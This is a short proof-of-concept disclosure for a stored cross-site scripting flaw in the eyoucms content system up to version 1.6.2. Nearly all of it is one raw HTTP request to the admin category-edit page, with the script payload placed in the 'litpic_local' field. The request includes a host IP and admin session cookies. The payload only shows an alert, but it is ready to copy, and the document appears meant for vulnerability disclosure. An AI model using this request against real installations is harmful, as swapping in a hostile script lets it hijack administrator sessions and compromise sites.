eyoucms up to 1.6.2 'litpic_loca' stored xss vulnerability
POC:

```
POST /eyou/login.php?m=admin&c=Arctype&a=edit&lang=cn HTTP/1.1
Host: 8.38.80.107
Content-Length: 608
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://8.38.80.107
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://8.38.80.107/eyou/login.php?m=admin&c=Arctype&a=edit&id=2&lang=cn
Accept-Language: zh-CN,zh;q=0.9
Cookie: img_id_upload=; imgname_id_upload=; USER_NAME_COOKIE=admin; SID_1=4f30a293; home_lang=cn; admin_lang=cn; PHPSESSID=sll5gtvfio3b23536i6m0fecrg; referurl=http%3A%2F%2F8.38.80.107%2Feyou%2Findex.php%3Fm%3Duser%26c%3DUsers%26a%3Dinfo; ENV_UPHTML_AFTER=%7B%22seo_uphtml_after_home%22%3A0%2C%22seo_uphtml_after_channel%22%3A%221%22%2C%22seo_uphtml_after_pernext%22%3A%221%22%7D; ENV_IS_UPHTML=0; admin-treeClicked_All=0; admin-treeClicked=close; admin-arctreeClicked_All=0; admin-arctreeClicked-Arr=%5B%5D; admin-treeClicked-1649642233=close; workspaceParam=index%7CArctype; admin-treeClicked-Arr=%5B1%2C2%5D; ENV_GOBACK_URL=%2Feyou%2Flogin.php%3Fm%3Dadmin%26c%3DProduct%26a%3Dindex%26typeid%3D3%26lang%3Dcn; ENV_LIST_URL=%2Feyou%2Flogin.php%3Fm%3Dadmin%26c%3DProduct%26a%3Dindex%26lang%3Dcn
Connection: close

typename=%E6%96%B0%E9%97%BB%E5%8A%A8%E6%80%81&dirname=xinwendongtai&current_channel=1&parent_id=0&channeltype=1&diy_dirpath=%2Fxinwendongtai&dirpath=&is_hidden=0&is_part=0&typelink=&englist_name=News+%26+Trends&litpic_local=%3Cimg+src%3D1+onerror%3Dalert%281%29%3E&litpic_remote=&old_arcrank=0&typearcrank=0&templist=lists_article.htm&tempview=view_article.htm&rulelist=%7B%E6%A0%8F%E7%9B%AE%E7%9B%AE%E5%BD%95%7D%2Flist_%7Btid%7D_%7Bpage%7D.html&ruleview=%7B%E6%A0%8F%E7%9B%AE%E7%9B%AE%E5%BD%95%7D%2F%7Baid%7D.html&seo_title=&seo_keywords=&seo_description=&tab=1&id=2&grade=0&oldgrade=0&old_current_channel=1
```

Then when user edit it again, a xss will be triggered.


